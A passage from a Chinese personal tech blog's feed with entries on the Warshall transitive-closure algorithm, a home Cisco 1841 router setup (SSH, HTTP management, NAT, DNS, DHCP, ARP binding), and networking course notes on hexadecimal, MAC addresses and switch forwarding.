class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="warshell算法">Warshell算法</h2><p>Floyd-Warshall算法（Floyd-Warshallalgorithm），中文亦称弗洛伊德算法，是解决任意两点间的最短路径的一种算法，可以正确处理有向图或负权（但不可存在负权回路）的最短路径问题，同时也被用于计算有向图的传递闭包。</p><p>一个非常简单的动态规划算法，其核心理念为内部顶点限制的扩张。有点类似与一种广度优先扩张算法，不断的放宽条件进行迭代。</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp">function <span class="token function">warshall</span><span class="token punctuation">(</span>m<span class="token operator">:</span> number<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">:</span> number<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">{</span>  let n <span class="token operator">=</span> m<span class="token punctuation">.</span>length  <span class="token comment">// m的复制</span>  let w <span class="token operator">=</span> m<span class="token punctuation">.</span><span class="token function">map</span><span class="token punctuation">(</span>v <span class="token operator">=</span><span class="token operator">&gt;</span> v<span class="token punctuation">.</span><span class="token function">slice</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token keyword">for</span> <span class="token punctuation">(</span>let k <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> k <span class="token operator">&lt;</span> n<span class="token punctuation">;</span> k<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token comment">// 内部顶点的限制 </span>    <span class="token keyword">for</span> <span class="token punctuation">(</span>let i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> n<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token comment">// i</span>      <span class="token keyword">for</span> <span class="token punctuation">(</span>let j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> j <span class="token operator">&lt;</span> n<span class="token punctuation">;</span> j<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token comment">// j</span>        <span class="token comment">// 最核心的递推公式</span>        <span class="token comment">// 情况1 在不把节点k放入内部顶点集合中时， m[i][j] 本身已经是一条可达路径，所以可以直接返回 1</span>        <span class="token comment">// 情况2 在不把节点k放入内部顶点集合中时 m[i][k] m[k][j] 都可到达，新增的这个k节点让 w[i][j] 成为一条可以到达的路径 也返回1</span>        <span class="token comment">// w 矩阵为 Wk 矩阵 也就是当前准备计算的矩阵 m 为上一个矩阵</span>        w<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> m<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">||</span> <span class="token punctuation">(</span>m<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>k<span class="token punctuation">]</span> <span class="token operator">&amp;&amp;</span> m<span class="token punctuation">[</span>k<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">)</span>      <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    m <span class="token operator">=</span> w  <span class="token punctuation">}</span>  <span class="token keyword">return</span> w<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 数学 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 离散数学 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Cisco 1841 路由器个人用途自定义配置</title>
      <link href="/2022/04/03/cisco-1841-lu-you-qi-ge-ren-gai-zhuang/"/>
      <url>/2022/04/03/cisco-1841-lu-you-qi-ge-ren-gai-zhuang/</url>
      
        <content type="html"><![CDATA[<h1 id="cisco-1841-路由器个人用自定义配置">Cisco 1841路由器个人用自定义配置</h1><h2 id="路由器基础配置">路由器基础配置</h2><h3 id="权限">权限</h3><p><strong>Cisco</strong>路由器的设计颇具编程和工业美感。权限管理类似Linux,需要<code>enable (en)</code>进入特权模式。使用后<code>exit</code>退出。终端前的<code>&gt; / #</code>会提示当前权限状态</p><h3 id="命令">命令</h3><p>在无冲突命令的情况下，命令可以被简写。</p><p>如<code>interface -&gt; int</code>,<code>configure -&gt; con</code></p><h3 id="快捷键">快捷键</h3><p><code>Ctrl + A</code>：移动光标至行头</p><p><code>Ctr l+ E</code>：移动光标至行尾</p><p><code>Ctrl + U</code>：刪除一行(要先使用Ctrl+E)</p><p><code>Ctrl + Shift + 6</code>：Cisco命令行独有 中断Cisco IOSProcess，如：Ping指令</p><p><code>Ctrl + C</code>：中断当前行Command</p><p><code>Ctrl + Z</code>：结束Configure Mode，回到Privilege Mode</p><p>常用命令：</p><pre class="line-numbers language-none"><code class="language-none"># show history# terminal history size 50 !历史记录条数# terminal length 100      !每一行最多字符个数，多余的以 ...$形式省略# show running-config | include hostname (只打印包含hostname的配置)&nbsp;&nbsp; =&gt; 可以用 begin, exclude, include, secion<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="安装向导">安装向导</h3><p>终端内执行<code>setup</code>开启安装向导。注意<code>secret</code>是Hash存储密码，level5为MD5加密，level7为思科自有算法加密，<code>password</code>为明文存储，且二者不能被同时设置。</p><p>使用 <code>service password-encryption</code> 开启密码加密</p><h3 id="设置保存">设置保存</h3><p>每次重启路由器时，路由器都会丢弃当前设置，从内存(NVRAM)中重新读取设置。</p><p>这就需要我们及时存储当前设置。</p><pre class="line-numbers language-none"><code class="language-none">write memorycopy running-config startup-config<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>这两条命令是等效的，会把设置保存到内存中</p><p>备份设置也很简单：</p><pre class="line-numbers language-none"><code class="language-none">copy startup-config flash:[备份文件]<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>会将设置备份到CompactFlash卡中</p><h3 id="远程管理访问">远程管理访问</h3><p>管理 Cisco Router 有多种方式：console, tty, vty, aux...</p><p>出于安全原因，除了console的远程访问，都是被默认关闭的。</p><h4 id="ssh">SSH</h4><h5 id="验证设备是否支持ssh">验证设备是否支持SSH</h5><p><code>show ip ssh</code></p><h5 id="生成-rsa-密钥对">生成 RSA 密钥对</h5><p><code>crypto key generate rsa</code>生成新的密钥，如果选择了2048-bit长度的，为了安全，生成时长可能高达10分钟左右。<br><code>crypto key zeroize rsa</code>清除先前生成的密钥，同时也会关闭SSH</p><h5 id="登录用户">登录用户</h5><pre class="line-numbers language-none"><code class="language-none">Router(config)#username &lt;用户名&gt; privilege &lt;0-15&gt; password &lt;密码&gt; ! 新建一个用户Router(config)#ip ssh time-out 120             !修改超时时间Router(config)#ip ssh authentication-retries 1 !修改重认证次数。Router(config)#ip ssh version 2                !修改SSH版本Router(config)#ip domain-name man.com    !配置域名为man.comRouter(config)#crypto key generate rsa   !生成加密密钥Router(config)#username man secret cisco !在本地创建一个用户名为man并且加密密码为cisco的用户。Router(config-line)#transport input ssh  !启用SSH登陆Router(config-line)#login local          !采用本地验证Router(config-line)#privilege level 15   !默认为enable模式<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>如果想要SSH登录后默认就是 <strong>enable</strong> 模式的话：</p><pre class="line-numbers language-none"><code class="language-none">username&nbsp;&lt;username&gt; privilege 15 secret&nbsp;&lt;passowrd&gt;aaa new-modelaaa authentication login default group tacacs+ local&nbsp;aaa authorization exec default group tacacs+ localaaa authorization exec LOCAL auto-enable<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="终端ssh登录报错">终端ssh登录报错</h5><p>Cisco使用的ssh算法比较老旧，需要设置ssh参数支持。</p><p>位于： - 全局：/etc/ssh_config - 用户：~/.ssh/config</p><pre class="line-numbers language-none"><code class="language-none">#Ciphers aes128-ctr,aes192-ctr,aes256-ctr,arcfour256,arcfour128,aes128-cbc,3des-cbc,blowfish-cbc,cast128-cbc,aes192-cbc,aes256-cbc,arcfour#KexAlgorithms ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group-exchange-sha256,diffie-hellman-group-exchange-sha1,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1#MACs hmac-md5,hmac-sha1,umac-64@openssh.com,hmac-ripemd160,hmac-sha1-96,hmac-md5-96,hmac-sha2-256,hmac-sha2-256-96,hmac-sha2-512,hmac-sha2-512-96<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>选择合适的设置取消注释即可。</p><p><a href="https://community.cisco.com/t5/security-documents/guide-to-better-ssh-security/ta-p/3133344">Reference</a></p><h4 id="httphttps-登入管理">HTTP/HTTPS 登入管理</h4><pre class="line-numbers language-none"><code class="language-none">R1(config)#ip http server ## 启动 http server，默认端口为TCP 80R1(config)#ip http port 8080 ## 可以更改端口R1(config)#ip http authentication local ## default 使用 enable 密碼 ， 這裡改為本地認證<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>可选参数：</p><pre class="line-numbers language-none"><code class="language-none">R1(config)#ip http max-connections 5R1(config)#ip http access-class 20 ## 可以设置 ACL 来仅放行特定 source ip如果要使用HTTPS：R1(config)#ip http secure-server ## 其他同http server<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>看:</p><pre class="line-numbers language-none"><code class="language-none">R1#sh ip http server all<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="telnet">TELNET</h3><blockquote><p><a href="https://www.cisco.com/c/en/us/support/docs/ios-nx-os-software/ios-software-releases-110/45843-configpasswords.html">CiscoSupport</a></p></blockquote><h3 id="ntp时间同步设置">NTP时间同步设置</h3><pre class="line-numbers language-none"><code class="language-none">ntp update-calendarntp server 202.118.1.81<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>默认会获取格林尼治时间，需要切换到 <strong>UTC+8</strong>：</p><p><code>clock timezone CST +8</code></p><p>更新硬件时间：</p><p><code>clock update-calendar</code></p><h2 id="网络基础配置">网络基础配置</h2><h3 id="配置内网接口">配置内网接口</h3><pre class="line-numbers language-none"><code class="language-none">interface FastEthernet0/0description Uplink to Home Routerip address dhcpip nat outside<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="配置外网接口">配置外网接口</h3><pre class="line-numbers language-none"><code class="language-none">interface FastEthernet0/1description Local LANip address 192.168.1.1 255.255.255.0ip nat inside<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="开启重载端口映射nat">开启重载端口映射(NAT)</h3><pre class="line-numbers language-none"><code class="language-none">ip nat inside source list 1 interface FastEthernet0/0 overload<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="出接口">出接口</h3><p>（可以使用下一跳代替）我在使用无限AP的环境中将下一跳设置为主路由，<code>tracert</code>就不会提示经过无线AP的IP了。</p><pre class="line-numbers language-none"><code class="language-none">ip route 0.0.0.0 0.0.0.0 FastEthernet0/0 dhcp<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p></p><h3 id="访问列表开放权限">访问列表开放权限</h3><pre class="line-numbers language-none"><code class="language-none">access-list 1 permit 10.0.0.0 0.255.255.255<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="dns服务器">DNS服务器</h3><p>在路由器上启动DNS服务。</p><pre class="line-numbers language-none"><code class="language-none">R1#conf tR1(config)# ip dns server<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>我们需要在路由器上配置公共的域名服务器，该设置可以使得路由器进行“递归式”的DNS查询。换而言之，当路由器所接收到的每个工作站的请求时，路由器都会通过询问多个DNS服务器，最终将结果反馈给发送请求的工作站。</p><pre class="line-numbers language-none"><code class="language-none">R1(config)#ip name-server 1.1.1.1R1(config)#ip name-server 1.0.0.1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>思科的路由器IOS允许你最多设置6个不同的DNS服务器。通常情况下，你会设置成本地服务提供商的DNS服务器地址，以此保证快速的响应；随后配置一些免费的公共DNS服务器地址，这样配置保证了你可以通过本地ISP或公共DNS服务器来获得响应。</p><p>第三步，配置DNS服务器对本地用户名和IP地址进行映射。设置完成后，当Alan的PC试图ping或连接Wayne的PC，路由器将成功解析他的netbios名称到适当的ip地址。配置如下：</p><pre class="line-numbers language-none"><code class="language-none">R1(config)#ip host alice 192.168.1.10R1(config)#ip host bob 192.168.1.11<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>设置工作站时，你可以把路由器的IP地址设置为主DNS服务器的地址。</p><h3 id="dhcp-服务器配置">DHCP 服务器配置</h3><p>DHCP服务的配置</p><pre class="line-numbers language-none"><code class="language-none">dhcp#configure terminal&nbsp;&nbsp;&nbsp; //进入全局模式dhcp(config)#service dhcp&nbsp;&nbsp;&nbsp;&nbsp; //打开dhcp功能dhcp(config)#no ip dhcp conflictlogging&nbsp;&nbsp; //关闭dhcp日志记录dhcp(config)#ip dhcp pool cisco&nbsp;&nbsp;&nbsp;&nbsp; //配置dhcp服务器的名称为ciscodhcp(dhcp-config)#network 192.168.1.0 255.255.255.0&nbsp;&nbsp;&nbsp;&nbsp; //配置dhcp服务器要分配的网段dhcp(dhcp-config)#default-router 192.168.1.1&nbsp;&nbsp;&nbsp; //配置默认网关为192.168.1.1dhcp(dhcp-config)#dns-server 192.168.1.1&nbsp;&nbsp;&nbsp; //配置dns服务器为192.168.1.1dhcp(dhcp-config)#lease 3 //地址租用期限: 3天dhcp(dhcp-config)#exit&nbsp;&nbsp;&nbsp; //退出dhcp配置模式dhcp(config)#ip&nbsp; dhcp&nbsp; excluded-address 192.168.1.200 192.168.1.254&nbsp; //配置dhcp不分配的地址<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>客户端获取IP地址</p><pre class="line-numbers language-none"><code class="language-none">Client#configure terminal&nbsp; &nbsp;//进入全局模式dhcp(config)#interface FastEthernet0/0&nbsp; &nbsp;&nbsp;//进入fastethernet0/0接口dhcp(config-if)#ip address dhcp&nbsp; &nbsp;&nbsp;//从dhcp服务器获取IP地址<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="dhcp分配静态ip">DHCP分配静态IP</h3><pre class="line-numbers language-none"><code class="language-none">ip dhcp pool vlan31network 172.31.255.0 255.255.255.0default-router 172.31.255.254dns-server 202.96.209.133 8.8.8.8<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>先将特殊IP地址从dhcp中剔除掉，以免后面造成ip地址冲突</p><pre class="line-numbers language-none"><code class="language-none">ip dhcp excluded-address 172.31.255.1ip dhcp excluded-address 172.31.255.100<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>编写一个静态IP地址的pool</p><pre class="line-numbers language-none"><code class="language-none">ip dhcp pool static_vlan31_1host 172.31.255.100 255.255.255.0client-identifier 015c.f9dd.48c0.da //mac前面要补“01”dns-server 202.96.209.133 8.8.8.8default-router 172.31.255.254lease infinite //永久<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>如果要立即生效，需要清空自动分配ip的缓存</p><pre class="line-numbers language-none"><code class="language-none">dmz_cisco3750#clear ip dhcp binding *dmz_cisco3750#show ip dhcp bindingIP address Client-ID/ Lease expiration TypeHardware address172.31.255.100 015c.f9dd.48c0.da Infinite Manualdmz_cisco3750#<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>为了避免其他用户私自修改保留的静态IP地址，需要再增加arp绑定信息</p><pre class="line-numbers language-none"><code class="language-none">arp 172.31.255.100 5cf9.dd48.c0da arpa<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>具体命令如下:</p><pre class="line-numbers language-none"><code class="language-none">dmz_cisco3750(config)#do show arpProtocol Address Age (min) Hardware Addr Type InterfaceInternet 172.31.255.100 0 5cf9.dd48.c0da ARPA Vlan31dmz_cisco3750(config)#arp 172.31.255.100 5cf9.dd48.c0da arpadmz_cisco3750(config)#do show arpProtocol Address Age (min) Hardware Addr Type InterfaceInternet 172.31.255.100 - 5cf9.dd48.c0da ARPA<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="解决dhcp客户端机器获取ip慢的问题">解决DHCP客户端机器获取IP慢的问题</h3><p>在常见的DHCP部署中，很容易遇到的问题就是，当客户端接入进去，获取地址很慢，或者是获取不到地址，但是DHCP是没问题的，很常见的问题就是生成树导致的，PC接入的时候，生成树要计算，花费30s的时间，所以容易造成获取地址不到的情况，可以配置STP的快速端口，来解决该问题，跳过生成树的检查。</p><h4 id="在路由器上">在路由器上：</h4><pre class="line-numbers language-none"><code class="language-none">Cisco-1841(config)#interface f0/1Cisco-1841(config-if)#spanning-tree portfast bpduguard<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h4 id="在交换机上">在交换机上：</h4><pre class="line-numbers language-none"><code class="language-none">Cisco-2960(config)#interface range f0/2-5Cisco-2960(config-if-range)#spanning-tree portfast<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="nat-端口映射">NAT 端口映射</h3><p>静态NAT： </p><pre class="line-numbers language-none"><code class="language-none">1. 指定NAT内部接口    在内网相应接口的接口配置模式下执行：    ip nat inside2. 指定NAT外部接口    在外网相应接口的接口配置模式下执行：    ip nat outside3. 在内部本地地址与内部全局地址之间建立静态地址转换关系：    ip nat inside source static 内部本地地址 内部全局地址4. 在外部全局地址与外部本地地址之间建立静态地址转换关系：    ip nat outside source static 外部全局地址 外部本地地址5.     show ip nat translations：显示当前存在的NAT转换信息。     show ip nat statics：查看NAT的统计信息。     show ip nat translations verbose：显示当前存在的NAT转换的详细信息。     debug ip nat：跟踪NAT操作，显示出每个被转换的数据包。     clear ip nat translations *:删除NAT映射表中的所有内容.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p></p><p>动态地址NAT：</p><p></p><pre class="line-numbers language-none"><code class="language-none">1. 指定NAT内部接口    在内网相应接口的接口配置模式下执行：    ip nat inside2. 指定NAT外部接口    在外网相应接口的接口配置模式下执行：    ip nat outside3. 在全局配置模式下，定义一个标准的access-list规则，声明允许哪些内部本地地址可以进行动态地址转换：    access-list list-number permit 源地址 通配符        其中，list-number为1－99之间的一个任意整数。4. 在全局配置模式下，定义内部全局地址池：    ip nat pool 地址池名  起始IP地址  终止IP地址  netmask  子网掩码        其中，地址池名可以任意设定，但最好有一定的说明意义。5. 在全局配置模式下，定义符合先前定义的access-list规则的IP数据包与先前定义的地址池中的IP地址进行转换：    ip nat inside source list list-number pool 内部全局地址池名6.     no ip nat pool name删除全局地址池    no access-list access-list-number删除访问列表    no ip nat inside source删除动态源地址转换<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p></p><p>网络地址端口转换NAPT(PAT)：</p><p></p><pre class="line-numbers language-none"><code class="language-none">1.指定NAT内部接口    在内网相应接口的接口配置模式下执行：ip nat inside2. 指定NAT外部接口    在外网相应接口的接口配置模式下执行：    ip nat outside3. 在全局配置模式下，定义内部全局地址池：    ip nat pool  地址池名  起始IP地址  终止IP地址  netmask  子网掩码        其中，地址池名可以任意设定，但最好有一定的说明意义。4. 在全局配置模式下，定义一个标准的access-list规则，声明允许哪些内部本地地址可以进行复用地址转换：    access-list list-number permit 源地址 通配符        其中，list-number为1－99之间的一个任意整数。5. 在全局配置模式下，定义符合先前定义的access-list规则的IP数据包与先前定义的地址池中的IP地址进行复用地址转换：    ip nat inside source list list-number pool 内部全局地址池名 overload<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre> ### 更改MAC地址<p></p><pre class="line-numbers language-none"><code class="language-none">Cisco-1841(config-if)#mac-address ?  H.H.H  MAC address<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><blockquote><p><a href="https://developer.aliyun.com/article/469132">LearnMore</a><br><a href="https://blog.51cto.com/sunjie123/1673697">Learn More</a> <a href="https://community.cisco.com/t5/routing/login-to-directly-into-quot-privilege-mode-quot/td-p/2131983">AndMore</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 网络工程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Cisco </tag>
            
            <tag> 网络 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>思科人才孵化项目 Day4</title>
      <link href="/2022/04/01/si-ke-fu-hua-xiang-mu-day4/"/>
      <url>/2022/04/01/si-ke-fu-hua-xiang-mu-day4/</url>
      
        <content type="html"><![CDATA[<h1 id="思科孵化项目-day4">思科孵化项目 Day4</h1><h2 id="十六进制">十六进制</h2><p>十六进制（简写为hex或下标16）在数学中是一种逢16进1的进位制。一般用数字0到9和字母A到F表示，其中:A<sub>F相当于十进制的10</sub>15，这些称作十六进制数字。</p><p>例如十进制数<code>57</code>，在二进制写作<code>111001</code>，在16进制写作<code>39</code>。</p><p>现在的16进制则普遍应用在计算机领域，这是因为将4个位元（Bit）化成单独的16进制数字不太困难。1个字节(Byte)可以表示成2个连续的16进制数字。可是，这种混合表示法容易令人混淆，因此需要一些字首、字尾或下标来显示。</p><h3 id="python">Python</h3><p>调用Python内置<code>int()</code>函数把该字串转为数字。以下为在Python解释器编程环境下的操作示范：</p><p>把十六进制的字串转为十进制数字：<br><code>print int('ff', 16)</code><br><strong>255</strong></p><p>把十进制数字转换为以十六进制表示之字串，可调用内置的hex()函数：<br><code>print hex(255)</code><br><strong>0xff</strong></p><p>调用BinAscii模块其中的b2a_hex()函数，可把以ASCII编码的文字以十六进制表示：<br><code>print binascii.b2a_hex('A')</code><br><strong>41</strong></p><p>反之也可把以十六进制表示的文字，换成以ASCII编码的文字：<br><code>print binascii.a2b_hex('41')</code><br><strong>A</strong></p><h2 id="mac地址">MAC地址</h2><h3 id="简介">简介</h3><p>MAC地址（英语：Media Access ControlAddress），直译为媒体存取控制位址，也称为局域网地址（LANAddress），以太网地址（Ethernet Address）或物理地址（PhysicalAddress），它是一个用来确认网路设备位置的位址。在OSI模型中，第三层网路层负责IP地址，第二层资料链结层则负责MAC位址。MAC地址用于在网络中唯一标示一个网卡，一台设备若有一或多个网卡，则每个网卡都需要并会有一个唯一的MAC地址。</p><h3 id="格式">格式</h3><p>MAC位址共48位元（6个位元组），以十六进位表示。第一个byte的最低有效位元(LSB)为单播地址(0)/多播地址(1)，第一个byte从最低有效位元数去第2个bit为<strong>广域地址(0)</strong>/<strong>区域地址(1)</strong>。前3~24位元由IEEE决定如何分配给每一家制造商，且不重复，后24位元由实际生产该网路设备的厂商自行指定且不重复。</p><p><code>ff:ff:ff:ff:ff:ff</code> 则作为广播位址。</p><p><code>01:xx:xx:xx:xx:xx</code>是多播地址，<code>01:00:5e:xx:xx:xx是IPv4</code> 多播地址。</p><h3 id="举例">举例</h3><p>假设现有一台路由器，含有一个WAN埠及四个LAN埠。它的WAN埠会有一个如<code>61.61.61.61</code>的IP位址，也会有一个如<code>00:0A:02:0B:03:0C</code>的MAC位址。而它的四个LAN埠会各分配到一个例如<code>192.168.1.0/24</code>的IP位址，四个埠各会有一个不同的MAC位址。</p><h3 id="实验">实验</h3><p>使用 <code>show arp</code> 显示ARP表中的Mac地址</p><pre class="line-numbers language-none"><code class="language-none">Cisco-1841#show arpProtocol  Address          Age (min)  Hardware Addr   Type   InterfaceInternet  10.1.1.1                -   0021.d8ae.3cdd  ARPA   FastEthernet0/1Internet  10.1.1.2                -   3c2c.3099.075e  ARPAInternet  10.1.1.3                -   98fc.84e3.1024  ARPAInternet  10.1.1.4                -   2c30.3331.c201  ARPAInternet  10.1.1.5               38   f4ac.c197.9e40  ARPA   FastEthernet0/1Internet  10.1.1.7                0   000c.297a.26eb  ARPA   FastEthernet0/1Internet  10.1.1.10               -   0024.97f0.3356  ARPAInternet  10.1.1.250              -   e45f.0180.be93  ARPAInternet  219.217.199.75         20   000c.29cb.1c1a  ARPA   FastEthernet0/0Internet  219.217.199.100         -   0021.d8ae.3cdc  ARPA   FastEthernet0/0Internet  219.217.199.101        36   842b.2b60.7d00  ARPA   FastEthernet0/0Internet  219.217.199.102        35   842b.2b60.7cf8  ARPA   FastEthernet0/0Internet  219.217.199.103       229   000c.297a.26d7  ARPA   FastEthernet0/0Internet  219.217.199.162       137   3c2c.3099.075e  ARPA   FastEthernet0/0Internet  219.217.199.250         -   0021.d8ae.3cdc  ARPA   FastEthernet0/0Internet  219.217.199.254        18   001a.a9c3.5843  ARPA   FastEthernet0/0<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>此处有多个Vlan,所以有不同网段的。</p><h2 id="交换机原理">交换机原理</h2><p>那么这里讲的交换机一般都为二层交换机，为什么叫做二层交换机呢，是因为数据被封装成数据帧来进行转发。转发的是数据帧。包括以太网。</p><p>而一般交换机都处于二层，基于数据链路层的交换机，所以叫二层交换机。</p><p>同样的三层交换机，就是网络层的交换机，一般用于核心设备，带有网络功能。</p><p>交换机是根据主机的MAC地址来查找主机并转发数据的。</p><p>而Cisco的交换机在出厂的时候有一个基本的MAC地址。</p><p>同时每一个端口还对应一个MAC地址，这是CISCO特有的智能交换机。</p><p>类型长度：</p><ul><li><code>0x0800</code>表示ipv4</li><li><code>0x86DD</code>表示ipv6</li></ul><p>帧效验序列也叫<strong>FCS</strong></p><h3 id="以太网的命名方法">以太网的命名方法</h3><p><strong>100BASE-TX</strong></p><p>意思是传输速率是100M，base代表基带，即物理介质为以太网专用，tx代表物理传输线缆的类型，tx代表的是五类以上的双绞线，那么对应的fx代表的是光线。</p><p>在现实生活中，我们通常说的以太网是10M的，而快速以太网是100M的。</p><p>交换机的工作原理：</p><p><img src="https://googles.plus/images/loading.gif" data-original="https://img-blog.csdn.net/20151010123705164"></p><p><code>www.cisco.com.cn</code> 这是思科的中文网站。</p><p>交换机在转发数据的时候，是根据MAC地址来进行转发的。</p><p>当计算机PC发出一个数据帧要到 DES<code>www.cisco.com.cn</code></p><p>那么首先PC发出的数据帧会经过交换机SW。</p><p>而当经过交换机SW的时候，交换机SW会首先查找自己的MAC地址表，看是否有DES的MAC地址，并同时记住来自计算机PC的源MAC地址。&nbsp; &nbsp;1)如果主机A想发送数据给主机C，主机A首先会检查自己的ARP缓存表，查看是否有主机C的IP地址和MAC地址的对应关系，如果有，则会将主机B的MAC地址作为源MAC地址封装到数据帧中。如果没有，主机A则会发送一个ARP请求信息，请求的目标IP地址是主机C的IP地址，目标MAC地址是MAC地址的广播帧(即FF-FF-FF-FF-FF-FF)，源IP地址和MAC地址是主机A的IP地址和MAC地址。　2)当交换机接受到此数据帧之后，发现此数据帧是广播帧，因此，会将此数据帧从非接收的所有接口发送出去。这时候交换机就学到了A的MAC信息了。</p><p>3）当主机C接受到此数据帧后，会检查目的IP地址是否是自己的，并将主机A的IP地址和MAC地址的对应关系记录到自己的ARP缓存表中，同时C会发送一个ARP应答数据帧，其中包括自己的MAC地址。这个ARP应答数据帧在经过交换机时，交换机又学到了C的MAC地址信息了。</p><p>4)主机A在收到这个回应的数据帧之后，在自己的ARP缓存表中记录主机C的IP地址和MAC地址的对应关系。而此时交换机已经学习到了主机C和主机A的MAC地址了。</p><p>&nbsp; 